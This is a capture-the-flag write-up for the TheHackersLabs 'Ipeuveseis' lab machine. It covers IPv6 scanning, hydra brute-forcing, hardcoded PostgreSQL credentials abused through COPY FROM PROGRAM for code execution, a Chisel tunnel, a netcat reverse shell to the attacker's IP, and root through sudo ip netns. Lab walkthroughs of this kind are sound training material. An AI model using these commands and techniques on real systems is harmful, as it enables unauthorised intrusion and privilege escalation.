---
title: "TheHackersLabs Ipeuveseis Writeup"
date: 2026-04-19 12:53:00 +0000
categories: [TheHackersLabs, Writeups]
tags: [thehackerslabs, ctf, ipv6, privilege-escalation, rce]
description: "Complete walkthrough of exploiting an IPv6-based infrastructure, from reconnaissance through privilege escalation using network namespaces."
image:
  path: /assets/img/posts/thehackerslabs/ipeuveseis/ipeuveseis.png
---

## Overview

Ipeuveseis is a challenge focused on **IPv6 exploitation and privilege escalation**. The attack path involves:
1. IPv6 reconnaissance and port scanning
2. Web application brute-forcing
3. Extracting database credentials from application files
4. Remote code execution via PostgreSQL
5. Lateral movement through an isolated IPv6 network
6. Privilege escalation using network namespaces

---

## Phase 1: Reconnaissance

### Discovering IPv6 Neighbors

The first step is to enumerate the local IPv6 neighbors attached to our interface to identify the target's link-local IPv6 address.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ ip -6 neigh show dev eth1
fe80::a00:27ff:fe7c:f878 lladdr 08:00:27:7c:f8:78 router STALE 
```

**Key Finding:** The target machine (fe80::a00:27ff:fe7c:f878) is identified and marked as a router on the network.

### Port Scanning via IPv6

Now we perform a comprehensive SYN scan against the target's IPv6 address to discover open services. The `%eth1` suffix is required for link-local addresses to specify the network interface.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo nmap -6 -sS -p- --open --min-rate 5000 -vvv -n fe80::a00:27ff:fe7c:f878%eth1 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-24 09:01 CET
Initiating ND Ping Scan at 09:01
Scanning fe80::a00:27ff:fe7c:f878 [1 port]
Completed ND Ping Scan at 09:01, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:01
Scanning fe80::a00:27ff:fe7c:f878 [65535 ports]
Discovered open port 22/tcp on fe80::a00:27ff:fe7c:f878
Discovered open port 8080/tcp on fe80::a00:27ff:fe7c:f878
Completed SYN Stealth Scan at 09:01, 0.77s elapsed (65535 total ports)
Nmap scan report for fe80::a00:27ff:fe7c:f878
Host is up, received nd-response (0.00011s latency).
Scanned at 2026-01-24 09:01:04 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 08:00:27:7C:F8:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
           Raw packets sent: 65536 (4.194MB) | Rcvd: 65536 (3.932MB)
```

**Discovered Services:**
- **Port 22/tcp:** SSH (for potential direct access)
- **Port 8080/tcp:** HTTP web service (our entry point)

---

## Phase 2: Web Application Access

### Port Forwarding for Convenience

To interact with the IPv6 web service using standard tools and a browser, we forward a local IPv4 port (8082) to the target's IPv6 port (8080) using `socat`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo socat TCP6-LISTEN:8082,fork TCP6:[fe80::a00:27ff:fe7c:f878%eth1]:8080 &
[2] 5028
```

This allows us to access the service at `127.0.0.1:8082` as if it were a local IPv4 service.

![Login Portal](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125000625.png)

### Brute-forcing the Login

The web application presents an "IPv6 Corp Employee Portal" login page. We use `hydra` to brute-force the admin account credentials against the login form.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ hydra -l admin -P big.txt 127.0.0.1 -s 8082 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials. Please try again." -t 64 -f -VI
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-24 09:52:56
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 20477 login tries (l:1/p:20477), ~320 tries per task
[DATA] attacking http-post-form://127.0.0.1:8082/:username=^USER^&password=^PASS^:F=Invalid credentials. Please try again.
[8082][http-post-form] host: 127.0.0.1   login: admin   password: admin123
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-24 09:53:12
```

**Credentials Found:**
- **Username:** admin
- **Password:** admin123

After logging in with these credentials, we gain access to the admin dashboard:

![Admin Dashboard](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001056.png)

![User Profile](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001119.png)

![About Page](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001301.png)

![About Page](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001431.png)

![About Page](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001916.png)

---

## Phase 3: Exploitation - Database Enumeration

### Discovering Database Credentials

With access to the admin account, we explore the web application's directory structure. The application is running as the `www-data` user, which grants us access to application configuration files.

Looking inside the `/var/www/config` directory, we discover a `database.php` file containing PostgreSQL credentials:

```bash
www-data@ctf:/var/www/config$ ls -l
total 4
-rw-r--r-- 1 www-data www-data 1239 Jan 18 12:35 database.php
www-data@ctf:/var/www/config$ cat database.php 
<?php
/**
 * Database Configuration
 * 
 * WARNING: This file contains sensitive credentials
 * TODO: Move to environment variables (NEVER commit this!)
 * 
 * ===========================================
 * INTERNAL USE ONLY - Database Credentials
 * ===========================================
 * 
 * Application User:
 *   Host: fd00:1337:1::20
 *   Port: 5432
 *   Database: database
 *   User: user
 *   Pass: jec41Ew98zB4ch3nM0vP
 * 
 * Super Admin (for maintenance only):
 *   User: superadmin
 *   Pass: jHt9b8u5whZ55551zlY1
 */

// Application database credentials
define('DB_HOST', getenv('DB_HOST') ?: 'fd00:1337:1::20');
define('DB_PORT', getenv('DB_PORT') ?: '5432');
define('DB_NAME', getenv('DB_NAME') ?: 'database');
define('DB_USER', getenv('DB_USER') ?: 'user');
define('DB_PASS', getenv('DB_PASS') ?: 'jec41Ew98zB4ch3nM0vP');

function getDbConnection() {
    try {
        $dsn = "pgsql:host=" . DB_HOST . ";port=" . DB_PORT . ";dbname=" . DB_NAME;
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $pdo;
    } catch (PDOException $e) {
        error_log("Database connection failed: " . $e->getMessage());
        return null;
    }
}
```

**Critical Findings:**
- **PostgreSQL Host:** fd00:1337:1::20 (IPv6 address on an isolated network)
- **Port:** 5432 (standard PostgreSQL)
- **Superadmin User:** superadmin
- **Superadmin Password:** jHt9b8u5whZ55551zlY1

The presence of a `superadmin` account with hardcoded credentials is a security risk that we'll exploit for remote code execution.

---

## Phase 4: Remote Code Execution via PostgreSQL

### Testing RCE via the COPY Command

PostgreSQL's `COPY FROM PROGRAM` feature allows executing system commands. We create a PHP script to test command execution using the superadmin credentials:

```bash
cat > /tmp/rce.php << 'EOF'
<?php
$pdo = new PDO("pgsql:host=fd00:1337:1::20;port=5432;dbname=postgres", "superadmin", "jHt9b8u5whZ55551zlY1");

$pdo->exec("CREATE TEMP TABLE test (result text)");
$pdo->exec("COPY test FROM PROGRAM 'whoami'");
$command = $pdo->query("SELECT * FROM test")->fetchColumn();
echo "result: $command\n";

$pdo->exec("DROP TABLE test");

?>
EOF
```

Executing this script confirms code execution:

```bash
www-data@ctf:/tmp$ php rce.php 
result: postgres
```

**Success!** Commands execute with the privileges of the PostgreSQL `postgres` user.

### Enumerating Files on the Database Server

Next, we enhance our script to discover available files, particularly looking for SSH keys we can leverage for lateral movement:

```bash
cat > /tmp/rce.php << 'EOF'
<?php
// Conexión a PostgreSQL
$pdo = new PDO("pgsql:host=fd00:1337:1::20;port=5432;dbname=postgres", "superadmin", "jHt9b8u5whZ55551zlY1");
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

try {

    $pdo->exec("CREATE TEMP TABLE IF NOT EXISTS test (result text)");
    $pdo->exec("COPY test FROM PROGRAM 'find /home -type f 2>/dev/null'");
    
    $stmt = $pdo->query("SELECT * FROM test");
    $files = $stmt->fetchAll(PDO::FETCH_COLUMN, 0);
    
    // Mostrar cada archivo

    foreach($files as $file) {
	    echo "- " . $file . "\n";
        }

    
    // Limpiar tabla temporal
    $pdo->exec("DROP TABLE IF EXISTS test");
    
} catch(PDOException $e) {
    echo "Error: " . $e->getMessage() . "\n";
}

?>
EOF
```

Output:

```bash
www-data@ctf:/tmp$ php rce.php 
- /home/postgres/.ssh/id_rsa.pub
- /home/postgres/.ssh/id_rsa
```

**Key Discovery:** SSH keys exist for the postgres user, confirming we can pivot further.

---

## Phase 5: Lateral Movement

### Setting up Chisel Tunnel

The database server (fd00:1337:1::20) is on an isolated IPv6 network that our attack machine cannot directly access. We establish a reverse SOCKS proxy using Chisel to route traffic through our web-accessible compromise.

**On our Kali machine:**

```bash
┌──(suraxddq㉿kali)-[~/Downloads/chisel]
└─$ ./chi server -p 4234 --reverse
2026/01/24 13:23:50 server: Reverse tunnelling enabled
2026/01/24 13:23:50 server: Fingerprint wnKQXCtFJTDuOPrhVlyNEzYwZA+tJ32Pg//83kl3Vbk=
2026/01/24 13:23:50 server: Listening on http://0.0.0.0:4234
2026/01/24 13:23:51 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

This creates a reverse tunnel listening on port 1080 on our local machine, through which we can route traffic to the isolated IPv6 network.

---

## Phase 6: MAC to IPv6 Challenge

### Understanding the Challenge

After further exploration, we discover an API service (fd00:dead:beef::1:8081) that implements a security challenge: converting MAC addresses to their EUI-64 IPv6 equivalents and submitting them for validation.

The challenge documentation:

```json
{
  "challenge": {
    "description": "Convert all given MAC addresses to their EUI-64 IPv6 equivalents (fe80::/10 prefix). The service requires validation of ALL MAC addresses before granting command execution access.",
    "mac_list": [
      "00:11:22:33:44:55",
      "AA:BB:CC:DD:EE:FF",
      "12:34:56:78:9A:BC",
      "DE:AD:BE:EF:CA:FE",
      "01:23:45:67:89:AB"
    ],
    "requirements": [
      "You must send ALL MAC addresses from the challenge list above",
      "You must send the same number of IPv6 addresses as MAC addresses",
      "The order of MAC addresses and IPv6 addresses must match",
      "All conversions must be correct to proceed",
      "Use Content-Type: application/json header"
    ]
  },
  "endpoints": {
    "/validate": {
      "method": "POST",
      "description": "Validate MAC addresses and convert to IPv6 (must validate ALL MACs)",
      "required_parameters": {
        "mac_addresses": "Array of MAC addresses (all from challenge)",
        "ipv6_addresses": "Array of corresponding IPv6 addresses in EUI-64 format"
      },
      "example": {
        "mac_addresses": [
          "11:22:33:44:55:66"
        ],
        "ipv6_addresses": [
          "fe80::1322:33ff:fe44:5566"
        ]
      }
    },
    "/execute": {
      "method": "POST",
      "description": "Execute command (requires ALL MACs to be validated first)",
      "required_parameters": {
        "command": "Command to execute"
      }
    },
    "/status": {
      "method": "GET",
      "description": "Check validation status"
    }
  }
}
```

### Solving the MAC-to-IPv6 Challenge

We submit all MAC addresses with their corresponding EUI-64 IPv6 addresses to the `/validate` endpoint:

```bash
curl -6 -X POST http://[fd00:dead:beef::1]:8081/validate \
  -H "Content-Type: application/json" \
  -d '{
    "mac_addresses": [
      "00:11:22:33:44:55",
      "AA:BB:CC:DD:EE:FF",
      "12:34:56:78:9A:BC", 
      "DE:AD:BE:EF:CA:FE",
      "01:23:45:67:89:AB"
    ],
    "ipv6_addresses": [
      "fe80::211:22ff:fe33:4455",
      "fe80::a8bb:ccff:fedd:eeff",
      "fe80::1034:56ff:fe78:9abc",
      "fe80::dcad:beff:feef:cafe",
      "fe80::323:45ff:fe67:89ab"
    ]
  }'
```

### Verifying Validation Status

We check the `/status` endpoint to confirm all MACs were correctly validated:

```bash
curl -6 -s http://[fd00:dead:beef::1]:8081/status
{
  "total_macs": 5,
  "validated_macs": 5,
  "required_macs": 5,
  "status": "ready",
  "message": "All MACs validated"
}
```

**Status:** Ready for command execution!

---

## Phase 7: Remote Code Execution on API Server

### Testing Command Execution

Now that the challenge is solved, we have access to the `/execute` endpoint. We test it with a simple `whoami` command:

```bash
curl -6 -sX POST http://[fd00:dead:beef::1]:8081/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

{
  "command": "whoami",
  "returncode": 0,
  "stdout": "lenam\n",
  "stderr": ""
}
```

**Discovery:** Commands execute as the `lenam` user (not root).

### Triggering a Reverse Shell

We execute a Netcat reverse shell payload to gain interactive access:

```bash
curl -6 -X POST http://[fd00:dead:beef::1]:8081/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "nc 192.168.0.11 5555 -e /bin/bash"}'
```

### Catching the Reverse Shell

On our attack machine, we listen for the incoming connection:

```bash
┌──(suraxddq㉿kali)-[~/Downloads/chisel]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.0.11] from (UNKNOWN) [192.168.0.13] 49552
id
uid=1000(lenam) gid=1000(lenam) grupos=1000(lenam),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
script /dev/null -c bash
Script iniciado, el fichero de anotación de salida es '/dev/null'.
lenam@TheHackersLabs-ipeuveseis:~$
```

**Access Gained:** Interactive shell as user `lenam`

### Capturing the User Flag

```bash
lenam@TheHackersLabs-ipeuveseis:~$ cat user.txt 
e557d3b***
```

---

## Phase 8: Stabilizing Access

### Generating SSH Keys for Persistence

For a more stable and interactive session, we generate new SSH keys:

```bash
lenam@TheHackersLabs-ipeuveseis:~$ ssh-keygen 
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/lenam/.ssh/id_ed25519): 
Created directory '/home/lenam/.ssh'.
Enter passphrase for "/home/lenam/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/lenam/.ssh/id_ed25519
Your public key has been saved in /home/lenam/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:sW4Jc8iGqTmzSPT9NUcNptAX6TFiy9zqDTzzZ/jNSX8 lenam@TheHackersLabs-ipeuveseis
The key's randomart image is:
+--[ED25519 256]--+
|           ..    |
|        .o +.    |
|       .=.=+o    |
|     + ..*+oo    |
| .  o * S... .   |
|. .o.. = B.      |
| .=. .  =o*..  . |
|.. +  ....o+ o+ E|
|. .    .    +. +o|
+----[SHA256]-----+
```

### Establishing SSH Connection

We now connect directly via SSH using IPv6:

```bash
┌──(suraxddq㉿kali)-[~/Downloads/chisel]
└─$ ssh -6 lenam@fe80::a00:27ff:fe7c:f878%eth1             

Linux TheHackersLabs-ipeuveseis 6.12.57+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.57-1 (2025-11-05) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 24 17:18:24 2026 from fe80::a41e:8bac:4959:745d%enp0s3
lenam@TheHackersLabs-ipeuveseis:~$
```

---

## Phase 9: Privilege Escalation

### Discovering Sudo Permissions

We check what commands `lenam` can execute with elevated privileges:

```bash
lenam@TheHackersLabs-ipeuveseis:~$ sudo -l
Matching Defaults entries for lenam on TheHackersLabs-ipeuveseis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User lenam may run the following commands on TheHackersLabs-ipeuveseis:
    (ALL) NOPASSWD: /root/stack/scripts/block-web-host-access.sh, /root/stack/scripts/remove-web-host-block.sh
    (root) NOPASSWD: /usr/sbin/ip
```

**Critical Finding:** The user `lenam` can run `/usr/sbin/ip` as root without a password. This command allows manipulation of network namespaces, which we can exploit.

### Exploiting Network Namespaces for Root Access

The `ip netns` command (part of `/usr/sbin/ip`) allows creating and managing network namespaces. We can exploit this to escape the current user context by creating a namespace and accessing the root namespace:

```bash
lenam@TheHackersLabs-ipeuveseis:~$ sudo ip netns add foo
lenam@TheHackersLabs-ipeuveseis:~$ sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
lenam@TheHackersLabs-ipeuveseis:~$ sudo ip netns exec bar /bin/sh
# id
uid=0(root) gid=0(root) grupos=0(root)
```

**Explanation:**
1. We create a new namespace called "foo"
2. We create a symlink to `/proc/1/ns/net` (the namespace of the init process, which runs as root)
3. When we execute a shell within this namespace context, we gain root privileges

### Capturing the Root Flag

```bash
# cat root.txt
85731848****
```

---